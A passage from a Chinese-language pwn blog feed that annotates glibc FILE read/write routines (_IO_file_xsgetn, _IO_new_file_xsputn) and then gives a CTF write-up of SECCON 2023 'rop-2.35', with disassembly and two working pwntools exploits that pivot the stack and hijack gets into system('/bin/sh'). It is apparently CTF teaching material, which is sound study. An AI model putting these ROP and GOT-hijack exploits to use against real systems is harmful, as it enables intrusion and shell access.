class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">     the user buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_xsgetn)</span><br></pre></td></tr></table></figure><ol><li><p>如果buf为null</p><ul><li>如果savebase不为null,先将其释放并取消’在备份’标志位</li><li>调用doallocbuf申请缓冲区</li></ul></li><li><p>循环,条件为当需要的数据want大于0</p><ul><li><p>如果want不多于read缓冲区中拥有的数据,直接将缓冲区中的数据转移到内存,并调整gptr</p></li><li><p>否则如果want&gt;have</p><ul><li>如果have大于0,先将have中的数据转移到内存</li><li>如果处于备份模式,调用_IO_switch_to_main_get_area (fp);并结束当次循环</li><li>如果buf不为空且want小于缓冲区容量,调用underflow,若返回EOF则跳出循环,否则结束此次循环</li><li>如果缓冲区异常或者want大于缓冲区容量<ul><li>设置pptr和gptr</li><li>如果缓冲区存在且缓冲区大于128则count -= want % block_size;,即将超过缓冲区的部分直接调用系统调用读取,剩余部分则在下一次循环完成</li><li>调用系统调用read(fp, s, count),如果上一步没有修改count,那么这一步就可以直接调用系统调用read读取所有的内容,并且是直接读到目标区域不经过缓冲区,根据返回值有:<ul><li>如果返回为0,则设置文件标志为到达文件末尾,否则设置为发生错误,返回值小于0则设置错误标志位,两种情况下,都会跳出循环</li><li>返回值大于0,则继续向下执行</li></ul></li><li>s += count;want -= count;如果文件偏移不在末尾则调整offset</li><li>再次开始循环,进行前面的操作</li></ul></li></ul></li></ul></li></ol><ol><li>返回n-want(即读入的量)</li></ol><h2 id="xspuntn"><a href="#xspuntn" class="headerlink" title="xspuntn"></a>xspuntn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;<span class="comment">//绕过缓冲区</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure><ol><li>如果n小于等于0直接返回</li><li>如果文件时行缓冲且正处于写入模式<ul><li>如果b-end—w-ptr大于n,从要写入数据的末尾开始查找’\n’符,如果找到了设置count为’\n’字符前的数据长度,并将must_flush 置 1</li></ul></li><li>否则count=w_end - w_ptr</li><li>如果count大于0<ul><li>如果count&gt;todo,count=todo</li><li>将内存中的数据转移到缓冲区</li><li>s += count;to_do -= count;</li></ul></li><li>如果to_do + must_flush &gt; 0<ul><li>调用overflow,若返回EOF,则返回to_do == 0 ? EOF : n - to_do;</li><li>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</li><li>如果do_write大于0,调用new_do_write (f, s, do_write);写多余的<ul><li>如果写入数量小于do_write,返回n - to_do</li></ul></li><li>如果to_do还有剩,调用_IO_default_xsputn (f, s+do_write, to_do);</li></ul></li></ol><p>看_IO_default_xsputn (f, s+do_write, to_do);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">    count = more;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="type">ssize_t</span> i;</span><br><span class="line">      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">*p++ = *s++;</span><br><span class="line">      f-&gt;_IO_write_ptr = p;</span><br><span class="line">    &#125;</span><br><span class="line">  more -= count;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure><ol><li>如果more小于等于0直接返回0</li><li>循环<ul><li>如果f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end<ul><li>如果count&gt;more,count = more;</li><li>如果count&gt;20,将内存中的数据移动到缓冲区</li><li>否则如果count不为0但小于20,将内存中的数据逐个复制到缓冲区</li><li>如果more=0或者_IO_OVERFLOW (f, (unsigned char) *s++) == EOF结束循环,more!=0才会执行_IO_OVERFLOW,原因是因为前面已经填满了缓冲区需要刷新,其会单独往缓冲区写入一个字符(原本是处理行缓冲的机制),所以下面要more—</li><li>否则more—</li></ul></li></ul></li><li>返回n-more</li></ol><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><ol><li>综上可以看出缓冲区模式,对读取过程并没有什么影响,对写入过程的影响则要更大,不过都受到上层函数影响</li></ol>]]></content>
    
    
    <summary type="html">晕</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="_IO_FILE" scheme="https://ixout.github.io/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>赛题录</title>
    <link href="https://ixout.github.io/posts/26406/"/>
    <id>https://ixout.github.io/posts/26406/</id>
    <published>2023-09-16T12:46:50.000Z</published>
    <updated>2024-01-22T15:06:09.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023seccon-rop-2-35"><a href="#2023seccon-rop-2-35" class="headerlink" title="2023seccon-rop-2.35"></a>2023seccon-rop-2.35</h1><p><strong>标签:栈溢出|栈迁移|got劫持|rop</strong></p><p><strong>题目介绍:</strong>The number of ROP gadgets is declining worldwide.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;echo Enter something:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序就两行代码</p><p>汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000401156                               public main</span><br><span class="line">.text:0000000000401156                               main proc near                          ; DATA XREF: _start+18↑o</span><br><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               var_10= byte ptr -10h</span><br><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               ; __unwind &#123;</span><br><span class="line">.text:0000000000401156 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:000000000040115A 55                            push    rbp</span><br><span class="line">.text:000000000040115B 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000000000040115E 48 83 EC 10                   sub     rsp, 10h</span><br><span class="line">.text:0000000000401162 48 8D 05 9B 0E 00 00          lea     rax, command                    ; &quot;echo Enter something:&quot;</span><br><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br><span class="line">.text:000000000040117D</span><br><span class="line">.text:0000000000401182 90                            nop</span><br><span class="line">.text:0000000000401183 C9                            leave</span><br><span class="line">.text:0000000000401184 C3                            retn</span><br><span class="line">.text:0000000000401184                               ; &#125; // starts at 401156</span><br><span class="line">.text:0000000000401184</span><br><span class="line">.text:0000000000401184                               main endp</span><br><span class="line">.text:0000000000401184</span><br><span class="line">.text:0000000000401184                               _text ends</span><br><span class="line">.text:0000000000401184</span><br></pre></td></tr></table></figure><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>保护基本不用考虑</p><p>常规思路自然是泄露libc等</p><p>不过这题程序没有单独使用过输出函数</p><p>唯一一次输出使用system实现的</p><p>因此根本无法做到泄露</p><hr><p>第一次错误想法:</p><p>如下,可以发现gets的参数是由rbp确定的(rbp-0x10)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br></pre></td></tr></table></figure><p>那么修改rbp就可以做到任意写了</p><p>看到以下这段代码,升起了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401162 48 8D 05 9B 0E 00 00          lea     rax, command                    ; &quot;echo Enter something:&quot;</span><br><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br></pre></td></tr></table></figure><p>修改command处字符串为/bin/sh</p><p>之后再rop到代码中执行system处</p><p>并在此之前做栈迁移,防止system栈越界</p><p>不过这个想法直接胎死腹中了</p><p>因为command所在段根本没有写权限</p><hr><p>第二个思路:</p><p>同样是利用gets参数由rbp确定的</p><p>可以看到gets参数可控,system参数不可控</p><p>但如果把<strong>gets函数劫持为system</strong></p><p>那就可以<strong>执行可控参数的system函数</strong>了</p><p>具体实施:</p><p>首先栈溢出让程序再次执行以一次gets(返回时leave已经修改rbp为可写gets的got表处)</p><p>这样在第二次gets的时候修改gets的got表为</p><p>system@plt+binsh字符串+目标rbp+lr+填充padding+binsh地址+0x10+0x401171</p><p>为了让system栈不越界还得再次栈迁移将栈往高处迁移</p><p>并将rbp控制位为-0x10刚好为binsh字符串</p><p>这样返回执行以下代码时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br></pre></td></tr></table></figure><p>实际上执行的就是system(‘/bin/sh’)</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;rop-2-35.seccon.games&#x27;,9999)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b system&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">rbp1=<span class="number">0x404030</span></span><br><span class="line">pr=<span class="number">0x40113d</span></span><br><span class="line">gets=<span class="number">0x401171</span></span><br><span class="line">lr=<span class="number">0x401183</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(rbp1)+p64(gets))</span><br><span class="line">p.sendline(p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x404800</span>)+p64(lr)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7c0</span>+p64(<span class="number">0x404038</span>)+p64(gets))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="其它题解"><a href="#其它题解" class="headerlink" title="其它题解"></a>其它题解</h2><p>赛后发现这个题解更简单暴力</p><p>利用了main函数在返回时rdi是一个可写的地址(这就要去观察了,光理论分析要分析出有点难度)</p><p>于是在返回时直接调用gets@plt</p><p>然后又利用gets的返回值就是指向输入字符串的指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br></pre></td></tr></table></figure><p>再加上面的gadget</p><p>就可以直接利用了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p, u = pack, unpack</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;rop-2-35.seccon.games&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x401060</span></span><br><span class="line">ret = <span class="number">0x401110</span></span><br><span class="line">mov_rdi_rax_call_system = <span class="number">0x401169</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(gets)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(mov_rdi_rax_call_system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;//////////////////bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive(prompt=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>至于为什么要这么多<code>/</code>,不是很清楚但能观察到输入的字符串前面的某一个字符会变成其<code>ascii-1</code>对应的字符,例如<code>/</code>变为<code>.</code>,如果直接填<code>/bin/sh\x00</code>会变为<code>/bim/sh\x00</code></p><h1 id="ASIS2023-hipwn"><a href="#ASIS2023-hipwn" class="headerlink" 